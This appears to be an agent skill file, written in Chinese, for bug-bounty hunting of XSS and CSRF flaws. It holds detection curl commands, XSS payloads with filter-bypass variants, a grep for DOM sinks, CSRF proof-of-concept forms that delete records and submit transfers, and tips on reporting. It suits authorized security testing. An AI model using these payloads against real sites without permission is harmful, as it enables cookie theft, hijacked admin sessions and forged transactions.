---
name: xss-csrf-pwn
description: XSS反射/存储/DOM + CSRF GET/POST挖掘。Use when 看到输入回显点/存储型评论/表单无token。
---

# XSS & CSRF

> 蒸馏自CC挖洞武器库 xss-csrf-pwn（实战验证）

## XSS 快速检测

```bash
# 反射型：参数值回显在页面
curl "http://T/?q=<script>alert(1)</script>" | grep -i "script"
# 回显位置判断：HTML标签内/属性内/JS内（决定payload）
# 三标签法（最通用）
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<details/open/ontoggle=alert(1)>
# 属性内："><svg/onload=alert(1)>
# JS内：';alert(1)//
```

## 存储型（更高危）

- 评论/昵称/签名/文件名字段 → 存储 → 管理员页触发（偷Cookie/后台操作）
- 验证：提交payload → 用另一会话访问 → 触发

## DOM XSS

```bash
# 找源码中的危险 sink
grep -rE "innerHTML|document.write|eval\(|location\.(hash|search)|window\.name" *.js
# 源头：location.hash/search/referrer → sink
# payload：http://T/#<img src=x onerror=alert(1)>
```

## 绕过（过滤时）

```
<script> → <img onerror> <svg/onload> 事件属性
引号 → onerror=alert`1`（无引号）
关键词 → <ScRiPt>、&#x3c;script&#x3e;、\x3c
长度限制 → 短payload+外部js加载
```

## CSRF

```bash
# 特征：无CSRF token、无SameSite、状态变更请求可被跨站触发
# 验证：构造表单页（自动提交）→ 无登录访问 → 状态变化
# GET型（最简单）
<img src="http://T/delete?id=1">
# POST型（表单自动提交）
<form action="http://T/transfer" method="POST"><input name="amount" value="100"></form>
<script>document.forms[0].submit()</script>
```

## 提交要点

- XSS：反射型低危（SRC常不收），存储型+可打管理员=中危
- CSRF：需影响安全操作（改密/转账/改邮箱）才算，仅改昵称=不收
- 有真实危害链（偷Cookie/打管理员）才报
